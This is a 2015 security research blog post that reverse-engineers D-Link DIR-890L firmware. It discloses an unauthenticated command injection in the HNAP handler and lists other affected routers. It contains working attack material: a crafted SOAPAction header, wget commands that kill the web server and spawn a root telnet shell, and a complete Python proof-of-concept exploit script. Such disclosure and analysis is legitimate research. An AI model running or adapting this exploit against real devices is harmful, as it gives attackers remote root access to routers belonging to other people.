# Hacking the D-Link DIR-890L – /dev/ttyS0
[« Reversing Belkin’s WPS Pin Algorithm](http://www.devttys0.com/2015/04/reversing-belkins-wps-pin-algorithm/)

[What the Ridiculous Fuck, D-Link?! »](http://www.devttys0.com/2015/04/what-the-ridiculous-fuck-d-link/)

# Hacking the D-Link DIR-890L

By [Craig](http://www.devttys0.com/author/craig/ "View all posts by Craig") \| [April 10, 2015 - 2:37 pm](http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/ "2:37 pm") |January 8, 2019 [Embedded Systems](http://www.devttys0.com/category/embedded-systems/), [Reverse Engineering](http://www.devttys0.com/category/reverse-engineering/), [Security](http://www.devttys0.com/category/security/)

The past 6 months have been incredibly busy, and I haven’t been keeping up with D-Link’s latest shenanigans. In need of some entertainment, I went to their web page today and was greeted by this atrocity:

[![](http://www.devttys0.com/wp-content/uploads/2015/04/dlink_insane-1024x444.png)
](http://www.devttys0.com/wp-content/uploads/2015/04/dlink_insane.png)

D-Link’s $300 DIR-890L router

I think the most “insane” thing about this router is that it’s running the [same](https://github.com/zcutlip/exploit-poc/tree/master/dlink/dir-815-a1/hedwig_cgi_httpcookie) [buggy](http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html) firmware that D-Link has been cramming in their routers for years…[and the hits just keep on coming](https://www.youtube.com/watch?v=WQZqJ_-WAO8).

OK, let’s do the usual: grab the [latest](ftp://ftp2.dlink.com/PRODUCTS/DIR-890L/REVA/DIR-890L_REVA_FIRMWARE_1.03.B07.ZIP) firmware release, [binwalk](https://github.com/devttys0/binwalk) it and see what we’ve got:

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/7"
    116           0x74            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4905376 bytes
    1835124       0x1C0074        PackImg section delimiter tag, little endian size: 6345472 bytes; big endian size: 13852672 bytes
    1835156       0x1C0094        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 13852268 bytes, 2566 inodes, blocksize: 131072 bytes, created: 2015-02-11 09:18:37

Looks like a pretty standard Linux firmware image, and if you’ve looked at any D-Link firmware over the past few years, you’ll probably recognize the root directory structure:

    $ ls squashfs-root
    bin  dev  etc  home  htdocs  include  lib  mnt  mydlink  proc  sbin  sys  tmp  usr  var  www

All of the HTTP/UPnP/HNAP stuff is located under the htdocs directory. The most interesting file here is htdocs/cgibin, an ARM ELF binary which is executed by the web server for, well, just about everything: all CGI, UPnP, and HNAP related URLs are symlinked to this one binary:

    $ ls -l htdocs/web/*.cgi
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/captcha.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/conntrack.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/dlapn.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/dlcfg.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/dldongle.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/fwup.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/fwupload.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/hedwig.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/pigwidgeon.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/seama.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/service.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/webfa_authentication.cgi -> /htdocs/cgibin
    lrwxrwxrwx 1 eve eve 14 Mar 31 22:46 htdocs/web/webfa_authentication_logout.cgi -> /htdocs/cgibin

It’s been stripped of course, but there are plenty of strings to help us out. The first thing that main does is compare argv\[0] against all known symlink names (captcha.cgi, conntrack.cgi, etc) to decide which action it is supposed to take:

[![](http://www.devttys0.com/wp-content/uploads/2015/04/staircase-1024x746.png)
](http://www.devttys0.com/wp-content/uploads/2015/04/staircase.png)

“Staircase” code graph, typical of if-else statements

Each of these comparisons are strcmp‘s against the expected symlink names:

[![](http://www.devttys0.com/wp-content/uploads/2015/04/function_handlers-1024x422.png)
](http://www.devttys0.com/wp-content/uploads/2015/04/function_handlers.png)

Function handlers for various symlinks

This makes it easy to correlate each function handler to its respective symlink name and re-name the functions appropriately:

[![](http://www.devttys0.com/wp-content/uploads/2015/04/renamed_functions-1024x337.png)
](http://www.devttys0.com/wp-content/uploads/2015/04/renamed_functions.png)

Renamed symlink function handlers

Now that we’ve got some of the high-level functions identified, let’s start bug hunting. Other D-Link devices running essentially the same firmware have previously been exploited through both their [HTTP](http://www.s3cur1ty.de/node/703) and [UPnP](http://www.s3cur1ty.de/node/714) interfaces. However, the HNAP interface, which is handled by the hnap_main function in cgibin, seems to have been mostly overlooked.

[HNAP](http://www.google.com/patents/US7827252) (Home Network Administration Protocol) is a SOAP-based protocol, similar to UPnP, that is commonly used by D-Link’s “EZ” setup utilities to initially configure the router. Unlike UPnP however, all HNAP actions, with the exception of GetDeviceInfo (which is basically useless), require HTTP Basic authentication:

    POST /HNAP1 HTTP/1.1
    Host: 192.168.0.1
    Authorization: Basic YWMEHZY+
    Content-Type: text/xml; charset=utf-8
    Content-Length: length
    SOAPAction: "http://purenetworks.com/HNAP1/AddPortMapping"
     
    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
     <soap:Body>
      <AddPortMapping xmlns="http://purenetworks.com/HNAP1/">
       <PortMappingDescription>foobar</PortMappingDescription>
       <InternalClient>192.168.0.100</InternalClient>
       <PortMappingProtocol>TCP</PortMappingProtocol>
       <ExternalPort>1234</ExternalPort>
       <InternalPort>1234</InternalPort>
      </AddPortMapping>
     </soap:Body>
    </soap:Envelope>

The SOAPAction header is of particular importance in an HNAP request, because it specifies which HNAP action should be taken (AddPortMapping in the above example).

Since cgibin is executed as a CGI by the web server, hnap_main accesses HNAP request data, such as the SOAPAction header, via environment variables:

[![](http://www.devttys0.com/wp-content/uploads/2015/04/hnap_main_getenv-1024x497.png)
](http://www.devttys0.com/wp-content/uploads/2015/04/hnap_main_getenv.png)

SOAPAction = getenv(“HTTP_SOAPACTION”);

Towards the end of hnap_main, there is a shell command being built dynamically with sprintf; this command is then executed via system:

[![](http://www.devttys0.com/wp-content/uploads/2015/04/hnap_main_system-1024x464.png)
](http://www.devttys0.com/wp-content/uploads/2015/04/hnap_main_system.png)

sprintf(command, “sh %s%s.sh> /dev/console”, “/var/run/”, SOAPAction);

Clearly, hnap_main is using data from the SOAPAction header as part of the system command! This is a promising command injection bug, _if_ the contents of the SOAPAction header aren’t being sanitized, _and_ if we can get into this code block without authentication.

Going back to the beginning of hnap_main, one of the first checks it does is to see if the SOAPAction header is equal to the string [http://purenetworks.com/HNAP1/GetDeviceSettings](http://purenetworks.com/HNAP1/GetDeviceSettings); if so, then it skips the authentication check. This is expected, as we’ve already established that the GetDeviceSettings action does not require authentication:

[![](http://www.devttys0.com/wp-content/uploads/2015/05/strstr_soapaction-1024x183.png)
](http://www.devttys0.com/wp-content/uploads/2015/05/strstr_soapaction.png)

if(strstr(SOAPAction, “[http://purenetworks.com/HNAP1/GetDeviceSettings”](http://purenetworks.com/HNAP1/GetDeviceSettings”)) != NULL)

However, note that strstr is used for this check, which only indicates that the SOAPAction header _contains_ the [http://purenetworks.com/HNAP1/GetDeviceSettings](http://purenetworks.com/HNAP1/GetDeviceSettings) string, not that the header _equals_ that string.

So, if the SOAPAction header _contains_ the string [http://purenetworks.com/HNAP1/GetDeviceSettings](http://purenetworks.com/HNAP1/GetDeviceSettings), the code then proceeds to parse the action name (e.g., GetDeviceSettings) out of the header and remove any trailing double-quotes:

[![](http://www.devttys0.com/wp-content/uploads/2015/05/process_soapaction_header-1024x765.png)
](http://www.devttys0.com/wp-content/uploads/2015/05/process_soapaction_header.png)

SOAPAction = strrchr(SOAPAction, ‘/’);

It is the action name (e.g., GetDeviceSettings), parsed out of the header by the above code, that is sprintf‘d into the command string executed by system.

Here’s the code in C, to help highlight the flaw in the above logic:

    /* Grab a pointer to the SOAPAction header */
    SOAPAction = getenv("HTTP_SOAPACTION");
     
    /* Skip authentication if the SOAPAction header contains "http://purenetworks.com/HNAP1/GetDeviceSettings" */
    if(strstr(SOAPAction, "http://purenetworks.com/HNAP1/GetDeviceSettings") == NULL)
    {
        /* do auth check */
    }
     
    /* Do a reverse search for the last forward slash in the SOAPAction header */
    SOAPAction = strrchr(SOAPAction, '/');
    if(SOAPAction != NULL)
    {
        /* Point the SOAPAction pointer one byte beyond the last forward slash */
        SOAPAction += 1;
     
        /* Get rid of any trailing double quotes */
        if(SOAPAction[strlen(SOAPAction)-1] == '"')
        {
            SOAPAction[strlen(SOAPAction)-1] = '\0';
        }
    }
    else
    {
        goto failure_condition;
    }
     
    /* Build the command using the specified SOAPAction string and execute it */
    sprintf(command, "sh %s%s.sh > /dev/console", "/var/run/", SOAPAction);
    system(command);

The two important take-aways from this are:

1.  There is no authentication check if the SOAPAction header _contains_ the string [http://purenetworks.com/HNAP1/GetDeviceSettings](http://purenetworks.com/HNAP1/GetDeviceSettings)
2.  The string passed to sprintf (and ultimately system) is everything _after_ the last forward slash in the SOAPAction header

Thus, we can easily format a SOAPAction header that both satisfies the “no auth” check, and allows us to pass an arbitrary string to system:

    SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`reboot`"

The [http://purenetworks.com/HNAP1/GetDeviceSettings](http://purenetworks.com/HNAP1/GetDeviceSettings) portion of the header satisfies the “no auth” check, while the \`reboot\` string ends up getting passed to system:

    system("sh /var/run/`reboot`.sh > /dev/console");

Replacing reboot with telnetd spawns a telnet server that provides an unauthenticated root shell:

    $ wget --header='SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`telnetd`"' http://192.168.0.1/HNAP1
    $ telnet 192.168.0.1
    Trying 192.168.0.1...
    Connected to 192.168.0.1.
    Escape character is '^]'.
     
     
    BusyBox v1.14.1 (2015-02-11 17:15:51 CST) built-in shell (msh)
    Enter 'help' for a list of built-in commands.
     
    #

If remote administration is enabled, HNAP requests are honored from the WAN, making remote exploitation possible. Of course, the router’s firewall will block any incoming telnet connections from the WAN; a simple solution is to kill off the HTTP server and spawn your telnet server on whatever port the HTTP server was bound to:

    $ wget --header='SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`killall httpd; telnetd -p 8080`"' http://1.2.3.4:8080/HNAP1
    $ telnet 1.2.3.4 8080
    Trying 1.2.3.4...
    Connected to 1.2.3.4.
    Escape character is '^]'.
     
     
    BusyBox v1.14.1 (2015-02-11 17:15:51 CST) built-in shell (msh)
    Enter 'help' for a list of built-in commands.
     
    #

Note that the wget requests will hang, since cgibin is essentially waiting for telnetd to return. A little Python PoC makes the exploit less awkward:

    #!/usr/bin/env python
     
    import sys
    import urllib2
    import httplib
     
    try:
        ip_port = sys.argv[1].split(':')
        ip = ip_port[0]
     
        if len(ip_port) == 2:
            port = ip_port[1]
        elif len(ip_port) == 1:
            port = "80"
        else:
            raise IndexError
    except IndexError:
        print "Usage: %s <target ip:port>" % sys.argv[0]
        sys.exit(1)
     
    url = "http://%s:%s/HNAP1" % (ip, port)
    # NOTE: If exploiting from the LAN, telnetd can be started on
    #       any port; killing the http server and re-using its port
    #       is not necessary.
    #
    #       Killing off all hung hnap processes ensures that we can
    #       re-start httpd later.
    command = "killall httpd; killall hnap; telnetd -p %s" % port
    headers = {
                "SOAPAction"    : '"http://purenetworks.com/HNAP1/GetDeviceSettings/`%s`"' % command,
              }
     
    req = urllib2.Request(url, None, headers)
    try:
        urllib2.urlopen(req)
        raise Exception("Unexpected response")
    except httplib.BadStatusLine:
        print "Exploit sent, try telnetting to %s:%s!" % (ip, port)
        print "To dump all system settings, run (no quotes): 'xmldbc -d /var/config.xml; cat /var/config.xml'"
        sys.exit(0)
    except Exception:
        print "Received an unexpected response from the server; exploit probably failed. :("

I’ve tested both the v1.00 and v1.03 firmware (v1.03 being the latest at the time of this writing), and both are vulnerable. But, as is true with most embedded vulnerabilities, this code has snuck its way into other devices as well.

Analyzing “all the firmwares” is tedious, so I handed this bug over to our Centrifuge team at [work](http://tacnetsol.com), who have a great automated analysis system for this sort of thing. Centrifuge found that at least the following devices are also vulnerable:

-   DAP-1522 revB
-   DAP-1650 revB
-   DIR-880L
-   DIR-865L
-   DIR-860L revA
-   DIR-860L revB
-   DIR-815 revB
-   DIR-300 revB
-   DIR-600 revB
-   DIR-645
-   TEW-751DR
-   TEW-733GR

AFAIK, there is no way to disable HNAP on any of these devices.

UPDATE:

Looks like this same bug was [found](http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10051) earlier this year by Samuel Huntly, but only reported and patched for the DIR-645. The patch looks pretty shitty though, so expect a follow-up post soon.

Bookmark the [permalink](http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/ "Permalink to Hacking the D-Link DIR-890L").

[« Reversing Belkin’s WPS Pin Algorithm](http://www.devttys0.com/2015/04/reversing-belkins-wps-pin-algorithm/)

[What the Ridiculous Fuck, D-Link?! »](http://www.devttys0.com/2015/04/what-the-ridiculous-fuck-d-link/)

32. Pingback: [D-Link DAP-1520 hacking: Part 1 | «WatchMySys» Blog](http://watchmysys.com/blog/2016/03/d-link-dap-1520-hacking-part-1/) 
    [http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/](http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/)
